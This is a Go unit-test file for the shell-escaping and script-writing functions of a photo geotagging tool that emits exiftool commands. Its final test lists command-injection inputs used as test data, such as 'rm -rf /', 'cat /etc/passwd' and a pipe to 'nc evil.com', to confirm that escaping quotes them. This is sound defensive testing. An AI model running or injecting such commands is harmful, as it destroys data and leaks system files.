package processor

import (
	"bytes"
	"os"
	"strings"
	"testing"

	"github.com/abpatel/exif-geotagger/pkg/exiftool"
)

func TestEscapeShellArg(t *testing.T) {
	tests := []struct {
		name     string
		arg      string
		expected string
	}{
		{
			name:     "simple alphanumeric",
			arg:      "hello",
			expected: "hello",
		},
		{
			name:     "with space",
			arg:      "hello world",
			expected: "'hello world'",
		},
		{
			name:     "with leading space",
			arg:      " hello",
			expected: "' hello'",
		},
		{
			name:     "with trailing space",
			arg:      "hello ",
			expected: "'hello '",
		},
		{
			name:     "with tab",
			arg:      "hello\tworld",
			expected: "'hello\tworld'",
		},
		{
			name:     "with newline",
			arg:      "hello\nworld",
			expected: "'hello\nworld'",
		},
		{
			name:     "single quote inside",
			arg:      "it's",
			expected: "'it'\\''s'",
		},
		{
			name:     "multiple single quotes",
			arg:      "it's a 'test'",
			expected: "'it'\\''s a '\\''test'\\'''",
		},
		{
			name:     "double quote",
			arg:      `say "hello"`,
			expected: "'say \"hello\"'",
		},
		{
			name:     "backslash",
			arg:      "path\\to\\file",
			expected: "'path\\to\\file'",
		},
		{
			name:     "dollar sign",
			arg:      "$HOME",
			expected: "'$HOME'",
		},
		{
			name:     "backtick",
			arg:      "`ls`",
			expected: "'`ls`'",
		},
		{
			name:     "asterisk",
			arg:      "*.jpg",
			expected: "'*.jpg'",
		},
		{
			name:     "question mark",
			arg:      "file?",
			expected: "'file?'",
		},
		{
			name:     "exclamation",
			arg:      "file!.jpg",
			expected: "'file!.jpg'",
		},
		{
			name:     "hash",
			arg:      "file#1.jpg",
			expected: "'file#1.jpg'",
		},
		{
			name:     "ampersand",
			arg:      "file&output",
			expected: "'file&output'",
		},
		{
			name:     "pipe",
			arg:      "file|grep",
			expected: "'file|grep'",
		},
		{
			name:     "semicolon",
			arg:      "cmd1;cmd2",
			expected: "'cmd1;cmd2'",
		},
		{
			name:     "less than",
			arg:      "input<file",
			expected: "'input<file'",
		},
		{
			name:     "greater than",
			arg:      "output>file",
			expected: "'output>file'",
		},
		{
			name:     "parentheses",
			arg:      "(inside)",
			expected: "'(inside)'",
		},
		{
			name:     "curly braces",
			arg:      "{expand}",
			expected: "'{expand}'",
		},
		{
			name:     "square brackets",
			arg:      "[pattern]",
			expected: "'[pattern]'",
		},
		{
			name:     "tilde",
			arg:      "~user",
			expected: "'~user'",
		},
		{
			name:     "percent",
			arg:      "100%",
			expected: "'100%'",
		},
		{
			name:     "caret",
			arg:      "^start",
			expected: "'^start'",
		},
		{
			name:     "empty string",
			arg:      "",
			expected: "''",
		},
		{
			name:     "utf-8 simple",
			arg:      "hello世界",
			expected: "hello世界",
		},
		{
			name:     "utf-8 with spaces",
			arg:      "hello 世界",
			expected: "'hello 世界'",
		},
		{
			name:     "complex path",
			arg:      "/path/with spaces/file name.jpg",
			expected: "'/path/with spaces/file name.jpg'",
		},
		{
			name:     "path with single quote",
			arg:      "/path/O'Brien/file.jpg",
			expected: "'/path/O'\\''Brien/file.jpg'",
		},
		{
			name:     "all special chars",
			arg:      "!@#$%^&*()_+-=[]{}|;:'\",.<>?/`~\\",
			expected: "'!@#$%^&*()_+-=[]{}|;:'\\''\",.<>?/`~\\'",
		},
		{
			name:     "carriage return",
			arg:      "line\rbreak",
			expected: "'line\rbreak'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := escapeShellArg(tt.arg)
			if got != tt.expected {
				t.Errorf("escapeShellArg(%q) = %q, want %q", tt.arg, got, tt.expected)
			}
		})
	}
}

func TestShellEscape(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		args     []string
		expected string
	}{
		{
			name:     "command only",
			command:  "echo",
			args:     nil,
			expected: "echo",
		},
		{
			name:     "command with simple args",
			command:  "cp",
			args:     []string{"src.txt", "dst.txt"},
			expected: "cp src.txt dst.txt",
		},
		{
			name:     "command with arg containing space",
			command:  "mv",
			args:     []string{"file name.txt", "/new path/"},
			expected: "mv 'file name.txt' '/new path/'",
		},
		{
			name:     "exiftool example",
			command:  "exiftool",
			args:     []string{"-GPSLatitude=37.7749", "-GPSLongitude=-122.4194", "-overwrite_original", "image.jpg"},
			expected: "exiftool -GPSLatitude=37.7749 -GPSLongitude=-122.4194 -overwrite_original image.jpg",
		},
		{
			name:     "exiftool with spaces in filename",
			command:  "exiftool",
			args:     []string{"-GPSLatitude=37.7749", "-overwrite_original", "my photo.jpg"},
			expected: "exiftool -GPSLatitude=37.7749 -overwrite_original 'my photo.jpg'",
		},
		{
			name:     "shell special characters in args",
			command:  "sh",
			args:     []string{"-c", "echo $HOME"},
			expected: "sh -c 'echo $HOME'",
		},
		{
			name:     "empty string arg",
			command:  "test",
			args:     []string{""},
			expected: "test ''",
		},
		{
			name:     "multiple args with various escaping needs",
			command:  "convert",
			args:     []string{"input file.jpg", "-resize", "100x100", "output#1.jpg"},
			expected: "convert 'input file.jpg' -resize 100x100 'output#1.jpg'",
		},
		{
			name:     "utf-8 args",
			command:  "echo",
			args:     []string{"你好世界", "hello世界"},
			expected: "echo 你好世界 hello世界",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := shellEscape(tt.command, tt.args...)
			if got != tt.expected {
				t.Errorf("shellEscape(%q, %v) = %q, want %q", tt.command, tt.args, got, tt.expected)
			}
		})
	}
}

func TestFileScriptWriter(t *testing.T) {
	// Create a temporary file
	tmpfile, err := os.CreateTemp("", "script-test-*.sh")
	if err != nil {
		t.Fatal(err)
	}
	defer os.Remove(tmpfile.Name())
	tmpfile.Close()

	// Test writing commands
	writer, err := NewFileScriptWriter(tmpfile.Name())
	if err != nil {
		t.Fatal(err)
	}

	testCases := []struct {
		command string
		args    []string
	}{
		{"echo", []string{"hello world"}},
		{"exiftool", []string{"-overwrite_original", "my file.jpg", "-GPSLatitude=37.7749"}},
		{"", []string{}}, // edge case: empty command
	}

	for _, tc := range testCases {
		err := writer.WriteCommand(tc.command, tc.args...)
		if err != nil {
			t.Fatalf("WriteCommand failed: %v", err)
		}
	}

	err = writer.Close()
	if err != nil {
		t.Fatalf("Close failed: %v", err)
	}

	// Read the file and verify contents
	content, err := os.ReadFile(tmpfile.Name())
	if err != nil {
		t.Fatalf("ReadFile failed: %v", err)
	}

	// Split lines, preserving empty lines but handling trailing newline
	lines := strings.Split(string(content), "\n")
	// Remove trailing empty string if content ends with newline
	if len(lines) > 0 && lines[len(lines)-1] == "" {
		lines = lines[:len(lines)-1]
	}

	if len(lines) != len(testCases) {
		t.Fatalf("Expected %d lines, got %d (lines: %v)", len(testCases), len(lines), lines)
	}

	// Verify each line
	expectedLines := []string{
		"echo 'hello world'",
		"exiftool -overwrite_original 'my file.jpg' -GPSLatitude=37.7749",
		"", // empty command results in blank line
	}

	for i, line := range lines {
		if line != expectedLines[i] {
			t.Errorf("Line %d: got %q, want %q", i+1, line, expectedLines[i])
		}
	}
}

func TestStdoutScriptWriter(t *testing.T) {
	// Capture stdout
	oldStdout := os.Stdout
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	os.Stdout = w

	writer := NewStdoutScriptWriter()

	// Write some commands
	err = writer.WriteCommand("echo", []string{"hello", "world"}...)
	if err != nil {
		t.Fatalf("WriteCommand failed: %v", err)
	}
	err = writer.WriteCommand("ls", []string{"-la", "/tmp"}...)
	if err != nil {
		t.Fatalf("WriteCommand failed: %v", err)
	}

	err = writer.Close()
	if err != nil {
		t.Fatalf("Close failed: %v", err)
	}

	// Close the writer and restore stdout
	w.Close()
	os.Stdout = oldStdout

	// Read captured output
	var buf bytes.Buffer
	buf.ReadFrom(r)
	output := buf.String()

	expected := "echo hello world\nls -la /tmp\n"
	if output != expected {
		t.Errorf("Stdout output:\ngot:\n%q\nwant:\n%q", output, expected)
	}
}

func TestScriptWriter_EmptyFile(t *testing.T) {
	tmpfile, err := os.CreateTemp("", "empty-script-*.sh")
	if err != nil {
		t.Fatal(err)
	}
	defer os.Remove(tmpfile.Name())
	tmpfile.Close()

	writer, err := NewFileScriptWriter(tmpfile.Name())
	if err != nil {
		t.Fatal(err)
	}

	// Close without writing anything
	err = writer.Close()
	if err != nil {
		t.Fatalf("Close failed: %v", err)
	}

	// File should exist but be empty or just newlines if we had written
	info, err := os.Stat(tmpfile.Name())
	if err != nil {
		t.Fatalf("Stat failed: %v", err)
	}
	if info.Size() != 0 {
		t.Errorf("Expected empty file, got size %d", info.Size())
	}
}

func TestScriptWriter_ErrorHandling(t *testing.T) {
	// Try to create writer with invalid path
	_, err := NewFileScriptWriter("/invalid/path/that/does/not/exist/file.sh")
	if err == nil {
		t.Error("Expected error for invalid path, got nil")
	}
}

func TestFileScriptWriter_WriteTagCommand(t *testing.T) {
	tmpfile, err := os.CreateTemp("", "tagcmd-test-*.sh")
	if err != nil {
		t.Fatal(err)
	}
	defer os.Remove(tmpfile.Name())
	tmpfile.Close()

	writer, err := NewFileScriptWriter(tmpfile.Name())
	if err != nil {
		t.Fatal(err)
	}

	// Create some metadata
	meta := exiftool.Metadata{
		GPSLatitude:  ptrFloat64(37.7749),
		GPSLongitude: ptrFloat64(-122.4194),
		City:         ptrString("San Francisco"),
	}

	// Write tag command
	err = writer.WriteTagCommand("image.jpg", meta)
	if err != nil {
		t.Fatalf("WriteTagCommand failed: %v", err)
	}

	err = writer.Close()
	if err != nil {
		t.Fatalf("Close failed: %v", err)
	}

	// Read file
	content, err := os.ReadFile(tmpfile.Name())
	if err != nil {
		t.Fatalf("ReadFile failed: %v", err)
	}

	// Should contain an exiftool command with proper escaping
	// BuildExiftoolArgs adds latRef and lonRef based on sign
	expected := "exiftool -GPSLatitude=37.774900 -GPSLongitude=-122.419400 -GPSLatitudeRef=N -GPSLongitudeRef=W '-City=San Francisco' -overwrite_original image.jpg\n"
	if string(content) != expected {
		t.Errorf("WriteTagCommand output:\ngot:\n%q\nwant:\n%q", string(content), expected)
	}
}

func TestFileScriptWriter_WriteSkipComment(t *testing.T) {
	tmpfile, err := os.CreateTemp("", "skipcmd-test-*.sh")
	if err != nil {
		t.Fatal(err)
	}
	defer os.Remove(tmpfile.Name())
	tmpfile.Close()

	writer, err := NewFileScriptWriter(tmpfile.Name())
	if err != nil {
		t.Fatal(err)
	}

	// Write skip comment
	err = writer.WriteSkipComment("image.jpg", "already has GPS data")
	if err != nil {
		t.Fatalf("WriteSkipComment failed: %v", err)
	}

	err = writer.Close()
	if err != nil {
		t.Fatalf("Close failed: %v", err)
	}

	// Read file
	content, err := os.ReadFile(tmpfile.Name())
	if err != nil {
		t.Fatalf("ReadFile failed: %v", err)
	}

	expected := "# SKIP image.jpg - already has GPS data\n"
	if string(content) != expected {
		t.Errorf("WriteSkipComment output:\ngot:\n%q\nwant:\n%q", string(content), expected)
	}
}

func TestStdoutScriptWriter_WriteTagCommand(t *testing.T) {
	// Capture stdout
	oldStdout := os.Stdout
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	os.Stdout = w

	writer := NewStdoutScriptWriter()

	meta := exiftool.Metadata{
		GPSLatitude:  ptrFloat64(37.7749),
		GPSLongitude: ptrFloat64(-122.4194),
	}

	err = writer.WriteTagCommand("my photo.jpg", meta)
	if err != nil {
		t.Fatalf("WriteTagCommand failed: %v", err)
	}

	err = writer.Close()
	if err != nil {
		t.Fatalf("Close failed: %v", err)
	}

	w.Close()
	os.Stdout = oldStdout

	var buf bytes.Buffer
	buf.ReadFrom(r)
	output := buf.String()

	expected := "exiftool -GPSLatitude=37.774900 -GPSLongitude=-122.419400 -GPSLatitudeRef=N -GPSLongitudeRef=W -overwrite_original 'my photo.jpg'\n"
	if output != expected {
		t.Errorf("Stdout WriteTagCommand output:\ngot:\n%q\nwant:\n%q", output, expected)
	}
}

func TestStdoutScriptWriter_WriteSkipComment(t *testing.T) {
	oldStdout := os.Stdout
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	os.Stdout = w

	writer := NewStdoutScriptWriter()

	err = writer.WriteSkipComment("file with spaces.jpg", "no valid timestamp")
	if err != nil {
		t.Fatalf("WriteSkipComment failed: %v", err)
	}

	err = writer.Close()
	if err != nil {
		t.Fatalf("Close failed: %v", err)
	}

	w.Close()
	os.Stdout = oldStdout

	var buf bytes.Buffer
	buf.ReadFrom(r)
	output := buf.String()

	expected := "# SKIP file with spaces.jpg - no valid timestamp\n"
	if output != expected {
		t.Errorf("Stdout WriteSkipComment output:\ngot:\n%q\nwant:\n%q", output, expected)
	}
}

// Helper functions to create pointers
func ptrFloat64(v float64) *float64 {
	return &v
}

func ptrString(s string) *string {
	return &s
}

// Test that the escaping produces a shell command that is safe to execute
func TestShellEscape_Safety(t *testing.T) {
	// Simulate an attacker trying to inject commands
	dangerousInputs := []struct {
		arg    string
		reason string
	}{
		{"file; rm -rf /", "semicolon for command chaining"},
		{"file && cat /etc/passwd", "ampersand for command chaining"},
		{"file | nc evil.com 1234", "pipe for data exfiltration"},
		{"file`whoami`", "backtick for command substitution"},
		{"file$(rm -rf /)", "dollar paren for command substitution"},
		{"file > /dev/null", "output redirection"},
		{"file < /etc/passwd", "input redirection"},
		{"file & background", "background execution"},
	}

	for _, test := range dangerousInputs {
		t.Run(test.reason, func(t *testing.T) {
			escaped := escapeShellArg(test.arg)
			// Ensure the dangerous characters are actually quoted
			if !strings.HasPrefix(escaped, "'") || !strings.HasSuffix(escaped, "'") {
				t.Errorf("Input %q was not properly quoted: got %q", test.arg, escaped)
			}
			// Ensure the raw dangerous characters don't appear unquoted
			if strings.Contains(escaped, ";") && !strings.Contains(escaped, "';'") && escaped != "'';''" {
				// Semicolon should only appear inside quotes
				if strings.Index(escaped, ";") < strings.Index(escaped, "'") || strings.Index(escaped, ";") > strings.LastIndex(escaped, "'") {
					t.Errorf("Potential unsafely placed semicolon in %q", escaped)
				}
			}
		})
	}
}
